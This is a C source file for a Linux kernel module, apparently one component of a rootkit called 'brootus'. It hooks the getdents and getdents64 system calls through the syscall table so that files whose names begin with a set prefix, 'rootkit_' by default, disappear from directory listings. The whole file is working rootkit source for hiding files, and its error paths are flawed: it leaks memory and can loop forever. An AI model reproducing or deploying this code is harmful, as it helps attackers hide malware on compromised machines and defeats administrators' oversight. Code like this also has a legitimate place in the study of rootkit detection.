#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>

#include "syscall.h"
#include "file_hiding.h"

#define STATE_FILES_VISIBLE 0
#define STATE_FILES_HIDDEN 1


asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);


int file_hiding_state = STATE_FILES_VISIBLE;


char* file_hiding_prefix = NULL;


int is_prefix(char* haystack, char* needle)
{
  char* haystack_ptr = haystack;
  char* needle_ptr = needle;

  if (needle == NULL) {
    return 0;
  }

  while (*needle_ptr != '\0') {
    if (*haystack_ptr == '\0' || *haystack_ptr != *needle_ptr) {
      return 0;
    }
    ++haystack_ptr;
    ++needle_ptr;
  }
  return 1;
}


asmlinkage int brootus_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  int ret;
  struct linux_dirent64* cur = dirp;
  int pos = 0;


  ret = original_getdents64 (fd, dirp, count); 

 
  while (pos < ret) {

   
    if (is_prefix(cur->d_name, file_hiding_prefix)) {
      int err;
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen; 
      int len = (int)dirp + ret - (int)next_rec; 
      char* remaining_dirents = kmalloc(len, GFP_KERNEL);

      
      err = copy_from_user(remaining_dirents, next_rec, len);
      if (err) {
        continue;
      }
      
      err = copy_to_user(cur, remaining_dirents, len);
      if (err) {
        continue;
      }
      kfree(remaining_dirents);

      
      ret -= reclen;
      continue;
    }

   
    pos += cur->d_reclen;
    cur = (struct linux_dirent64*) ((char*)dirp + pos);
  }
  return ret;
}

asmlinkage int brootus_getdents(unsigned int fd, struct linux_dirent*dirp, unsigned int count)
{
  // Analogous to 64 version
  int ret;
  struct linux_dirent* cur = dirp;
  int pos = 0;

  ret = original_getdents(fd, dirp, count); 
  while (pos < ret) {

    if (is_prefix(cur->d_name, file_hiding_prefix)) {
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      int len = (int)dirp + ret - (int)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
    }
    pos += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + pos);
  }
  return ret;
}

void set_file_prefix(char* prefix)
{
  kfree(file_hiding_prefix);
  file_hiding_prefix = kmalloc(strlen(prefix) + 1, GFP_KERNEL);
  strcpy(file_hiding_prefix, prefix);
}

void enable_file_hiding(void)
{
  if (file_hiding_state == STATE_FILES_HIDDEN) {
    return;
  }
  syscall_table_modify_begin();
  HOOK_SYSCALL(getdents);
  HOOK_SYSCALL(getdents64);
  syscall_table_modify_end();

  file_hiding_state = STATE_FILES_HIDDEN;
}

void disable_file_hiding(void)
{
  if (file_hiding_state == STATE_FILES_VISIBLE) {
    return;
  }
  syscall_table_modify_begin();
  RESTORE_SYSCALL(getdents);
  RESTORE_SYSCALL(getdents64);
  syscall_table_modify_end();

  file_hiding_state = STATE_FILES_VISIBLE;
}

void init_file_hiding(void)
{
  set_file_prefix("rootkit_");
  enable_file_hiding();
}

void finalize_file_hiding(void)
{
  disable_file_hiding();
  kfree(file_hiding_prefix);
}
